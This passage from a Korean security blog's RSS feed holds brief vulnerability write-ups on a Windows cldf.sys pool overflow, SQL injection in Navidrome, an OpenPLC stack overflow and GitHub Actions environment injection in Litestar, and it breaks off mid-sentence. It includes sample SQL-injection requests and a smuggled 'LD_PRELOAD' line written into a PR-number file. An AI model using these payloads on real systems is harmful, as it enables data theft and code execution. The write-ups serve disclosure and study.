c">LOWORD(v39) = <span class="hljs-number">0</span>;WORD1(v39) = v24;P = ExAllocatePoolWithTag(PagedPool, v24, &apos;sUsH&apos;); [3]InformationFile = P == <span class="hljs-number">0</span>i64 ? <span class="hljs-number">0xC000009A</span> : <span class="hljs-number">0</span>;HsmDbgBreakOnStatus((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)InformationFile);<span class="hljs-keyword">if</span> ( !P ){  <span class="hljs-keyword">if</span> ( WPP_GLOBAL_Control != (PDEVICE_OBJECT)&amp;WPP_GLOBAL_Control    &amp;&amp; (HIDWORD(WPP_GLOBAL_Control-&gt;Timer) &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>    &amp;&amp; BYTE1(WPP_GLOBAL_Control-&gt;Timer) &gt;= <span class="hljs-number">2u</span> )  {    WPP_SF_qd(      WPP_GLOBAL_Control-&gt;AttachedDevice,      <span class="hljs-number">184</span>i64,      &amp;WPP_78064aab483a35e2f1ef7b76ba44fd52_Traceguids,      a2,      InformationFile);  }  <span class="hljs-keyword">goto</span> LABEL_93;}memmove(P, *(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> **)(a2 + <span class="hljs-number">72</span>), *(<span class="hljs-keyword">unsigned</span> __int16 *)(a2 + <span class="hljs-number">64</span>));LOWORD(v39) = *(_WORD *)(a2 + <span class="hljs-number">64</span>) - <span class="hljs-number">2</span>;memmove((<span class="hljs-keyword">char</span> *)P + (<span class="hljs-keyword">unsigned</span> __int16)v39, Src, (<span class="hljs-keyword">unsigned</span> __int16)PathSize); [<span class="hljs-number">4</span>]</code></pre><p>&#xC5F0;&#xC0B0;&#xB41C; v24&#xB294; [3]&#xC5D0;&#xC11C; Pool&#xC744; &#xD560;&#xB2F9;&#xD558;&#xB294;&#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xB294;&#xB370;, &#xC2E4;&#xC81C; &#xC5F0;&#xC0B0;&#xB41C; &#xAC12;&#xBCF4;&#xB2E4; &#xC791;&#xC740; Pool&#xC774; &#xD560;&#xB2F9;&#xB418;&#xACE0; [4]&#xC5D0;&#xC11C; PathSize &#xB9CC;&#xD07C;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF5;&#xC0AC;&#xD558;&#xAC8C; &#xB418;&#xC5B4; Pool Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; RTLUShortAdd &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xB450; &#xAC12;&#xC774; &#xB354;&#xD574;&#xC84C;&#xC744; &#xB54C; Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xD655;&#xC778;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC744; &#xCD94;&#xAC00;&#xD574;, Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xACBD;&#xC6B0; USHORT&#xC758; &#xCD5C;&#xB300;&#xAC12;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xB3C4;&#xB85D; &#xC218;&#xC815;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">InformationFile = RtlUShortAdd(pusResult[<span class="hljs-number">1</span>], (USHORT)PathSize[<span class="hljs-number">0</span>], &amp;pusResult[<span class="hljs-number">1</span>]);</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/Microsoft/">Microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/cldf-sys/">cldf.sys</category>
      
      <category domain="https://hackyboiz.github.io/tags/Cloud-Filter-Driver/">Cloud Filter Driver</category>
      
      <category domain="https://hackyboiz.github.io/tags/Pool-Overflow/">Pool Overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2024-21310/">CVE-2024-21310</category>
      
      
      <comments>https://hackyboiz.github.io/2024/09/28/j0ker/2024-09-28/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-47062 : Navidrome의 SQL injection 취약점</title>
      <link>https://hackyboiz.github.io/2024/09/25/pwndorei/2024-09-25/</link>
      <guid>https://hackyboiz.github.io/2024/09/25/pwndorei/2024-09-25/</guid>
      <pubDate>Wed, 25 Sep 2024 11:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/navidrome/navidrome/security/advisorie</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/navidrome/navidrome/security/advisories/GHSA-58vj-cv5w-v4v6">https://github.com/navidrome/navidrome/security/advisories/GHSA-58vj-cv5w-v4v6</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Navidrome &#x2264; 0.52.5</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Navidrome&#xC740; Go&#xB85C; &#xAC1C;&#xBC1C;&#xB41C; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xC74C;&#xC545; &#xC2A4;&#xD2B8;&#xB9AC;&#xBC0D; &#xC11C;&#xBC84;&#xC785;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC591;&#xD55C; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xC640; &#xB3C4;&#xCEE4; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xD1B5;&#xD574; &#xC6F9; &#xAE30;&#xBC18;&#xC758; &#xC74C;&#xC545; &#xC2A4;&#xD2B8;&#xB9AC;&#xBC0D; &#xAE30;&#xB2A5;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xACE0; &#xC774;&#xB54C; URL &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xAC00; SQL &#xCFFC;&#xB9AC;&#xC5D0; &#xADF8;&#xB300;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xBA74;&#xC11C; &#xB2E4;&#xC218;&#xC758; SQL Injection &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC758; Navidrome&#xC5D0;&#xC11C;&#xB294; URL&#xC5D0;&#xC11C; &#xD30C;&#xC2F1;&#xD55C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xC790;&#xB3D9;&#xC801;&#xC73C;&#xB85C; <code>LIKE</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; SQL &#xCFFC;&#xB9AC;&#xC5D0; &#xCD94;&#xAC00;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; HTTP &#xC694;&#xCCAD;&#xC744; &#xD1B5;&#xD574; <code>password LIKE AAA%</code>&#xAC00; &#xC0BD;&#xC785;&#xB418;&#xACE0; &#xC774;&#xB97C; &#xD1B5;&#xD574; <code>password</code>&#xC758; &#xAC12;&#xC744; &#xBE0C;&#xB8E8;&#xD2B8; &#xD3EC;&#xC2F1;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs pgsql"><span class="hljs-keyword">GET</span> /api/<span class="hljs-keyword">user</span>?_end=<span class="hljs-number">36</span>&amp;_order=<span class="hljs-keyword">DESC</span>&amp;<span class="hljs-keyword">password</span>=AAA%</code></pre><p>&#xB610;&#xD55C; URL &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC758; &#xC774;&#xB984;&#xC744; &#xB530;&#xB85C; &#xAC80;&#xC0AC;&#xD558;&#xAC70;&#xB098; escape &#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; HTTP &#xC694;&#xCCAD;&#xC73C;&#xB85C; &#xC784;&#xC758;&#xC758; SQL &#xAD6C;&#xBB38;&#xC744; &#xC2E4;&#xD589;&#xC2DC;&#xD0A4;&#xB294; &#xAC83; &#xB610;&#xD55C; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs pgsql"><span class="hljs-keyword">GET</span> /api/album?_end=<span class="hljs-number">36</span>&amp;_order=<span class="hljs-keyword">DESC</span>&amp;_sort=recently_added&amp;_start=<span class="hljs-number">0</span>&amp;<span class="hljs-keyword">SELECT</span>+*+<span class="hljs-keyword">FROM</span>+<span class="hljs-keyword">USER</span><span class="hljs-comment">--=123 HTTP/1.1</span></code></pre><p>&#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xC790; &#xC778;&#xC99D; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC544;&#xB798;&#xC758; &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB3C4; &#xC7A0;&#xC7AC;&#xC801;&#xC778; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs css"><span class="hljs-selector-tag">func</span> (<span class="hljs-selector-tag">r</span> *<span class="hljs-selector-tag">userRepository</span>) <span class="hljs-selector-tag">FindByUsername</span>(<span class="hljs-selector-tag">username</span> <span class="hljs-selector-tag">string</span>) (<span class="hljs-selector-tag">model</span><span class="hljs-selector-class">.User</span>, <span class="hljs-selector-tag">error</span>) {    <span class="hljs-attribute">sel </span>:= r.<span class="hljs-built_in">newSelect</span>().<span class="hljs-built_in">Columns</span>(<span class="hljs-string">&quot;&quot;</span>).<span class="hljs-built_in">Where</span>(Like{<span class="hljs-string">&quot;user_name&quot;</span>: username})    var usr model.User    err := r.<span class="hljs-built_in">queryOne</span>(sel, &amp;usr)    return &amp;usr, err}</code></pre><p><code>username</code>&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xCC3E;&#xC744; &#xB54C; <code>Like</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xACE0; &#xC774;&#xB85C; &#xC778;&#xD574; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC774;&#xB984;&#xC5D0; <code>%</code> &#xB4F1;&#xC744; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xB85C;&#xADF8;&#xC778;&#xD558;&#xB294; &#xAC83; &#xD5C8;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xACB0;&#xB860;&#xC801;&#xC73C;&#xB85C; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xC5EC; &#xC784;&#xC758;&#xC758; SQL &#xAD6C;&#xBB38;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xACE0; DB&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC720;&#xCD9C;&#xD558;&#xB294; &#xB4F1;&#xC758; &#xD589;&#xC704;&#xAC00; &#xAC00;&#xB2A5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/SQL-injection/">SQL injection</category>
      
      <category domain="https://hackyboiz.github.io/tags/Navidrome/">Navidrome</category>
      
      
      <comments>https://hackyboiz.github.io/2024/09/25/pwndorei/2024-09-25/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-34026: OpenPLC Stack Buffer Overflow 취약점</title>
      <link>https://hackyboiz.github.io/2024/09/21/l0ch/2024-09-21/</link>
      <guid>https://hackyboiz.github.io/2024/09/21/l0ch/2024-09-21/</guid>
      <pubDate>Sat, 21 Sep 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://talosintelligence.com/vulnerability_reports/TALOS</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2024-2005">https://talosintelligence.com/vulnerability_reports/TALOS-2024-2005</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>OpenPLC_v3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC624;&#xD508;&#xC18C;&#xC2A4; &#xAE30;&#xBC18;&#xC758; Programmable Logic Controller(PLC)&#xC778; OpenPLC&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; Stack Buffer Overflow &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>OpenPLC&#xB294; ENIP(EtherNet/IP) &#xB4F1;&#xC758; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xBA70; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xD1B5;&#xD574; &#xC804;&#xC1A1;&#xB418;&#xB294; PCCC(Programmable Controller Communication Commands) &#xBA54;&#xC138;&#xC9C0;&#xB97C; &#xC9C0;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p>ENIP(EtherNet/IP): Ethernet Industrial Protocol&#xC744; &#xC758;&#xBBF8;&#xD558;&#xBA70; &#xACF5;&#xD1B5;&#xB41C; &#xC0B0;&#xC5C5; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xD45C;&#xC900; &#xC774;&#xB354;&#xB137; &#xAE30;&#xBC18;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xAC1C;&#xBC1C;&#xB41C; &#xC0B0;&#xC5C5; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC784;.</p></blockquote><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; OpenPLC&#xC758; ENIP &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xD30C;&#xC11C; &#xD568;&#xC218;&#xC778; <code>processEnipMessage</code> &#xD568;&#xC218;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">processEnipMessage</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *buffer, <span class="hljs-keyword">int</span> buffer_size)</span></span><span class="hljs-function"></span>{    <span class="hljs-comment">// initialize logging system</span>    <span class="hljs-keyword">char</span> log_msg[<span class="hljs-number">1000</span>];    <span class="hljs-keyword">char</span> *p = log_msg;<span class="hljs-comment">//...</span>    <span class="hljs-keyword">if</span> (header.command[<span class="hljs-number">0</span>] == <span class="hljs-number">0x6f</span>)<span class="hljs-comment">// Send RR Data</span>    {        ...    }    <span class="hljs-keyword">else</span>    {        p += <span class="hljs-built_in">sprintf</span>(p, <span class="hljs-string">&quot;Unknown EtherNet/IP request: &quot;</span>);        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; buffer_size; i++)        {            p += <span class="hljs-built_in">sprintf</span>(p, <span class="hljs-string">&quot;%02x &quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)buffer[i]);        }        p += <span class="hljs-built_in">sprintf</span>(p, <span class="hljs-string">&quot;\n&quot;</span>);        <span class="hljs-built_in">log</span>(log_msg);        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    }</code></pre><p><code>processEnipMessage</code>  &#xD568;&#xC218;&#xC758; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xB294; <code>buffer</code> &#xBC0F; <code>buffer_size</code>&#xB294; &#xACF5;&#xACA9;&#xC790;&#xAC00; ENIP &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xBA54;&#xC138;&#xC9C0;&#xB97C; &#xBCF4;&#xB0B4;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC81C;&#xC5B4; &#xAC00;&#xB2A5;&#xD558;&#xBA70;, &#xD568;&#xC218;&#xB294; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xB85C;&#xAE45;&#xD558;&#xAE30; &#xC704;&#xD574; 1000 bytes &#xD06C;&#xAE30;&#xC758; <code>log_msg</code> &#xC2A4;&#xD0DD; &#xBC84;&#xD37C;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4; ENIP &#xD5E4;&#xB354;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; Command Code&#xAC00; &#xC720;&#xD6A8;&#xD55C;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xB294;&#xB370;, &#xC774;&#xB54C; Command Code&#xAC00; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; else &#xBD84;&#xAE30;&#xC5D0;&#xC11C;  <code>log_msg</code> &#xB97C; &#xC5D0;&#xB7EC; &#xBA54;&#xC138;&#xC9C0;&#xB85C; &#xCC44;&#xC6B0;&#xACE0; &#xC774;&#xD6C4; &#xBA54;&#xC138;&#xC9C0; &#xD06C;&#xAE30;&#xC778; <code>buffer_size</code>&#xB9CC;&#xD07C;&#xC758; &#xACF5;&#xBC31;&#xBB38;&#xC790;&#xB97C; <code>log_msg</code> &#xBC84;&#xD37C;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xC704; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>buffer_size</code>&#xAC00; <code>log_msg</code> &#xBC84;&#xD37C; &#xD06C;&#xAE30;&#xBCF4;&#xB2E4; &#xD070;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xB2E4;&#xC74C; &#xC870;&#xAC74;&#xC5D0;&#xC11C; Stack Buffer Overflow &#xD2B8;&#xB9AC;&#xAC70;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>&#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xC740; Command Code</li><li>&#xC720;&#xD6A8;&#xD55C; &#xCEA1;&#xC290;&#xD654;&#xB41C; &#xD5E4;&#xB354;</li><li>500 bytes &#xC774;&#xC0C1;&#xC758; &#xCD1D; &#xBA54;&#xC138;&#xC9C0; &#xAE38;&#xC774;</li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/stack-buffer-overflow/">stack buffer overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/OpenPLC/">OpenPLC</category>
      
      <category domain="https://hackyboiz.github.io/tags/PLC/">PLC</category>
      
      
      <comments>https://hackyboiz.github.io/2024/09/21/l0ch/2024-09-21/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-42370: Litestar의 Environment Variable Injection로 인한 정보 유출 취약점</title>
      <link>https://hackyboiz.github.io/2024/09/18/ogu123/cve-2024-42370/</link>
      <guid>https://hackyboiz.github.io/2024/09/18/ogu123/cve-2024-42370/</guid>
      <pubDate>Wed, 18 Sep 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/litestar-org/litestar/security/a</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://github.com/litestar-org/litestar/security/advisories/GHSA-4hq2-rpgc-r8r7#event-274768">https://github.com/litestar-org/litestar/security/advisories/GHSA-4hq2-rpgc-r8r7#event-274768</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Litestar &lt;= 2.10.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Litestar&#xB294; Python &#xAE30;&#xBC18;&#xC758; ASGI(Asynchronous Server Gateway Interface) &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB85C;, &#xBE44;&#xB3D9;&#xAE30; &#xC6F9; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xACFC; API &#xAC1C;&#xBC1C;&#xC5D0; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>docs-preview.yml</code> &#xC6CC;&#xD06C;&#xD50C;&#xB85C;&#xC6B0;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xBA70;, Environment Variable Injection&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD574; &#xC815;&#xBCF4; &#xC720;&#xCD9C; &#xBC0F; &#xC800;&#xC7A5;&#xC18C; &#xACF5;&#xACA9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs dts"><span class="hljs-symbol">on:</span><span class="hljs-symbol">  workflow_run:</span><span class="hljs-symbol">    workflows:</span> [Tests And Linting]<span class="hljs-symbol">    types:</span> [completed]</code></pre><p><code>Tests And Linting</code> &#xC6CC;&#xD06C;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xC644;&#xB8CC;&#xB418;&#xBA74;, <code>docs-preview.yml</code> &#xC6CC;&#xD06C;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Download</span> <span class="hljs-string">artifact</span><span class="hljs-attr">uses:</span> <span class="hljs-string">dawidd6/action-download-artifact@v6</span><span class="hljs-attr">with:</span>  <span class="hljs-attr">workflow_conclusion:</span> <span class="hljs-string">success</span>  <span class="hljs-attr">run_id:</span> <span class="hljs-string">${{</span> <span class="hljs-string">github.event.workflow_run.id</span> <span class="hljs-string">}}</span>  <span class="hljs-attr">path:</span> <span class="hljs-string">docs-preview</span>  <span class="hljs-attr">name:</span> <span class="hljs-string">docs-preview</span></code></pre><p>&#xC774;&#xB54C; <code>Tests And Linting</code> &#xC6CC;&#xD06C;&#xD50C;&#xB85C;&#xC6B0;&#xC5D0;&#xC11C; &#xC0DD;&#xC131;&#xB41C; &#xC544;&#xD2F0;&#xD329;&#xD2B8;&#xB97C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xC555;&#xCD95;&#xC744; &#xD574;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs dockerfile">- name: Set PR number  <span class="hljs-keyword">run</span><span class="bash">: <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PR_NUMBER=<span class="hljs-subst">$(cat docs-preview/.pr_number)</span>&quot;</span> &gt;&gt; <span class="hljs-variable">$GITHUB_ENV</span></span></code></pre><p>&#xADF8; &#xD6C4; <code>docs-preview/.pr_number</code> &#xD30C;&#xC77C;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xC77D;&#xC5B4; <code>PR_NUMBER</code> &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB85C; &#xC124;&#xC815;&#xD558;&#xACE0; <code>$GITHUB_ENV</code> &#xD30C;&#xC77C;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>$GITHUB_ENV</code> &#xD30C;&#xC77C;&#xC740; GitHub Actions&#xC5D0;&#xC11C; &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB97C; &#xC815;&#xC758;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD30C;&#xC77C;&#xB85C; <code>KEY=VALUE</code> &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xAC12;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xBA74;, GitHub Actions&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB85C; &#xC778;&#xC2DD;&#xD574; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>.pr_number</code> &#xD30C;&#xC77C;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xACF5;&#xACA9;&#xC790;&#xAC00; <code>.pr_number</code> &#xD30C;&#xC77C;&#xC5D0; &#xC5EC;&#xB7EC; &#xC904;&#xC744; &#xD3EC;&#xD568;&#xC2DC;&#xCF1C; &#xCD94;&#xAC00; &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs awk"><span class="hljs-number">111</span>LD_PRELOAD=<span class="hljs-regexp">/home/</span>runner<span class="hljs-regexp">/work/</span>litestar<span class="hljs-regexp">/litestar/i</span>nject.so</code></pre><p>&#xACF5;&#xACA9;&#xC790;&#xB294; &#xC704;&#xC640; &#xAC19;&#xC774; <code>.pr_number</code> &#xD30C;&#xC77C; &#xB0B4;&#xC6A9;&#xC744; &#xC791;&#xC131;&#xD560; &#xACBD;&#xC6B0; <code>PR_NUMBER</code> , <code>LD_PRELOAD</code> &#xB450; &#xAC1C;&#xC758; &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xB294; <code>LD_PRELOAD</code> &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC545;&#xC131; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span> <span class="hljs-string">docs</span> <span class="hljs-string">preview</span>  <span class="hljs-attr">uses:</span> <span class="hljs-string">JamesIves/github-pages-deploy-action@v4</span>  <span class="hljs-attr">with:</span>    <span class="hljs-attr">folder:</span> <span class="hljs-string">docs-preview/docs/_build/html</span>    <span class="hljs-attr">token:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.DOCS_PREVIEW_DEPLOY_TOKEN</span> <span class="hljs-string">}}</span>    <span class="hljs-attr">repository-name:</span> <span class="hljs-string">litestar-org/litestar-docs-preview</span>    <span class="hljs-attr">clean:</span> <span class="hljs-literal">false</span>    <span class="hljs-attr">target-folder:</span> <span class="hljs-string">${{</span> <span class="hljs-string">env.PR_NUMBER</span> <span class="hljs-string">}}</span>    <span class="hljs-attr">branch:</span> <span class="hljs-string">gh-pages</span></code></pre><p>&#xC774;&#xD6C4; <code>docs-preview</code>&#xB97C; &#xBC30;&#xD3EC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>JamesIves/github-pages-deploy-action</code> Actions&#xC774; &#xC2E4;&#xD589;&#xB418;&#xACE0; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; node &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xACF5;&#xACA9;&#xC790; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xB85C;&#xB4DC;&#xD558;&#xAC8C; 